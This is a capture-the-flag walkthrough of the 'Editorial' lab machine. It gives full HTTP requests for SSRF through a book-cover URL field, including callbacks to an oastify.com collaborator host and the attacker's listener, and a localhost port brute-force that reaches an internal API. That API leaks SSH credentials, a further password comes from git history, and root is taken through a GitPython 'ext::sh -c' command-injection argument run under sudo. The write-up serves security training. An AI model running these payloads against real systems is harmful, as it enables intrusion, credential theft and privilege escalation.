# Reconnaissance
## Port Scanning
`$ nmap -p- -sV -sC -oA nmap 10.10.11.20 -Pn`
```
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.03 seconds
```

### Observe the HTTP
`$ echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts`
`$ firefox editorial.htb`

#### Publish with us
**POST Request**
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.7,id;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------259063515327354356161906145100
Content-Length: 1751
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=1

-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookurl"

http://em4q6dnue7rsetqq3m3tsdgs9jfa31zpo.oastify.com
-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookfile"; filename="nbsc.png"
Content-Type: image/png

PNG

   
IHDR  ô  ô   ËÖß   	pHYs  Ä  Ä+  åiTXtXML:com.adobe.xmp     <x:xmpmeta xmlns:x='adobe:ns:meta/'>
        <rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>

        <rdf:Description rdf:about=''
        xmlns:dc='http://purl.org/dc/elements/1.1/'>
        <dc:title>
        <rdf:Alt>
        <rdf:li xml:lang='x-default'>NUBSEC - 1</rdf:li>
        </rdf:Alt>
        </dc:title>
        </rdf:Description>

        <rdf:Description rdf:about=''
        xmlns:Attrib='http://ns.attribution.com/ads/1.0/'>
        <Attrib:Ads>
        <rdf:Seq>
        <rdf:li rdf:parseType='Resource'>
        <Attrib:Created>2024-05-25</Attrib:Created>
        <Attrib:ExtId>a57cc302-38d2-4562-8996-d32b168f9ebd</Attrib:ExtId>
        <Attrib:FbId>525265914179580</Attrib:FbId>
        <Attrib:TouchType>2</Attrib:TouchType>
        </rdf:li>
        </rdf:Seq>
        </Attrib:Ads>
        </rdf:Description>

        <rdf:Description rdf:about=''
        xmlns:pdf='http://ns.adobe.com/pdf/1.3/'>
        <pdf:Author>Bibib</pdf:Author>
        </rdf:Description>

        <rdf:Description rdf:about=''
        xmlns:xmp='http://ns.adobe.com/xap/1.0/'>
        <xmp:CreatorTool>Canva (Renderer)</xmp:CreatorTool>
        </rdf:Description>
        
        </rdf:RDF>
        </x:xmpmeta>
-----------------------------259063515327354356161906145100--
```

**the Response**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 27 Jun 2024 14:39:47 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 61

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

#### Testing for the SSRF
**Listening port**
`% nc -nlv 1234`

**Send the Request**
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.7,id;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------259063515327354356161906145100
Content-Length: 364
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=1

-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookurl"

http://10.10.16.65:1234
-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookfile"; filename="nbsc.png"
Content-Type: image/png

PNG

-----------------------------259063515327354356161906145100--
```

**Result**
```
% nc -nlv 1234
GET / HTTP/1.1
Host: 10.10.16.65:1234
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

### Bruteforce the HTTP Local Port
**POST Request**
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.7,id;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------259063515327354356161906145100
Content-Length: 362
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=1

-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:1234
-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookfile"; filename="nbsc.png"
Content-Type: image/png

PNG

-----------------------------259063515327354356161906145100--
```
Set the port between 1-65535 in the bruteforce value, then get the port 5000 with the different response.

**the Response**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 27 Jun 2024 14:57:59 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51

static/uploads/54937263-3781-4f8e-b359-8512906f4b57
```

#### Download the File
`% wget http://editorial.htb/static/uploads/54937263-3781-4f8e-b359-8512906f4b57`
```
--2024-06-27 22:35:00--  http://editorial.htb/static/uploads/54937263-3781-4f8e-b359-8512906f4b57
Resolving editorial.htb (editorial.htb)... 10.10.11.20
Connecting to editorial.htb (editorial.htb)|10.10.11.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 911 [application/octet-stream]
Saving to: ‘54937263-3781-4f8e-b359-8512906f4b57’
  
54937263-3781-4f8e-b359- 100%[==================================>]     911  --.-KB/s    in 0s      
  
2024-06-27 22:35:00 (37.8 MB/s) - ‘54937263-3781-4f8e-b359-8512906f4b57’ saved [911/911]
```

`% cat 54937263-3781-4f8e-b359-8512906f4b57| jq`
```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

# Pre-Exploitation
Try to get data from `/api/latest/metadata/messages/authors`
**POST Request**
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.7,id;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------259063515327354356161906145100
Content-Length: 362
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=1

-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/api/latest/metadata/messages/authors
-----------------------------259063515327354356161906145100
Content-Disposition: form-data; name="bookfile"; filename="nbsc.png"
Content-Type: image/png

PNG

-----------------------------259063515327354356161906145100--
```

**Response**
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 27 Jun 2024 16:26:44 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51

static/uploads/b98d6c1e-0646-4da7-bc90-6c96f72796f0
```

**Download the File**
`% wget http://editorial.htb/static/uploads/b98d6c1e-0646-4da7-bc90-6c96f72796f0`
```
--2024-06-27 23:36:03--  http://editorial.htb/static/uploads/b98d6c1e-0646-4da7-bc90-6c96f72796f0

Resolving editorial.htb (editorial.htb)... 10.10.11.20

Connecting to editorial.htb (editorial.htb)|10.10.11.20|:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 506 [application/octet-stream]

Saving to: ‘b98d6c1e-0646-4da7-bc90-6c96f72796f0’

  

b98d6c1e-0646-4da7-bc90-6c96f72796f0              100%[==========================================================================================================>]     506  --.-KB/s    in 0s      

  

2024-06-27 23:36:03 (17.9 MB/s) - ‘b98d6c1e-0646-4da7-bc90-6c96f72796f0’ saved [506/506]
```

`% cat b98d6c1e-0646-4da7-bc90-6c96f72796f0`
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

# Exploitation
```
\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\n
```
Try to use the credential above:
`% ssh dev@editorial.htb`
```
The authenticity of host 'editorial.htb (10.10.11.20)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
dev@editorial.htb's password: dev080217_devAPI!@
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)  

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  
 System information as of Thu Jun 27 04:32:25 PM UTC 2024
  
  System load:           0.06
  Usage of /:            60.3% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:feb9:31fa  


Expanded Security Maintenance for Applications is not enabled.
  
0 updates can be applied immediately. 

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
[dev@editorial:~$
[dev@editorial:~$ ls
apps  user.txt
[dev@editorial:~$ cat user.txt 
d86c43db95ce98a1450ac387675365d4
```

# Post-Exploitation
```
[dev@editorial:~/apps$ sudo -l
[sudo] password for dev: dev080217_devAPI!@
Sorry, user dev may not run sudo on editorial.
[dev@editorial:~$ ls -al
total 32
drwxr-x--- 4 dev  dev  4096 Jun  5 14:36 .
drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
drwxrwxr-x 3 dev  dev  4096 Jun  5 14:36 apps
-rw-r----- 1 root dev    33 Jun 27 16:09 user.txt
[dev@editorial:~$ ls -al apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
[dev@editorial:~$
```
```
[dev@editorial:~$ cd apps/
[dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (**HEAD ->** **master**)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500
  
    fix: bugfix in api port endpoint
  
commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500
  
    change: remove debug and update api port
  
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500
  
    change(api): downgrading prod to dev
    * To use development environment.
  
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500
  
    feat: create api to editorial info
    * It (will) contains internal info about the editorial, this enable
       faster access to information.
  
commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500
  
    feat: create editorial app
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```
`[dev@editorial:~/apps$ git show 1e84a036b2f33c59e2390730699a488c65643d28`
```
\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\n
```
## Lateral Movement
`% ssh prod@editorial.htb`
```
prod@editorial.htb's password: 080217_Producti0n_2023!@
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
  
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  
 System information as of Thu Jun 27 05:48:17 PM UTC 2024
  
  System load:           0.0
  Usage of /:            60.5% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:feb9:31fa
  

Expanded Security Maintenance for Applications is not enabled.
  
0 updates can be applied immediately.  

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status
  
  
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
```
```

[prod@editorial:~$ sudo -l
[sudo] password for prod: 080217_Producti0n_2023!@
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
[prod@editorial:~$
```
`[prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py`
```
#!/usr/bin/python3
  
import os
import sys
from git import Repo  

os.chdir('/opt/internal_apps/clone_changes')
  
url_to_clone = sys.argv[1]
  
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
Refer to: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
Exploit: https://github.com/gitpython-developers/GitPython/issues/1515

`[prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'`
```
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt% >% /tmp/root new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.
  
Please make sure you have the correct access rights
and the repository exists.
'
[prod@editorial:~$ cat /tmp/root
4c85d1c24d22bc93b352be15da8f89b0
```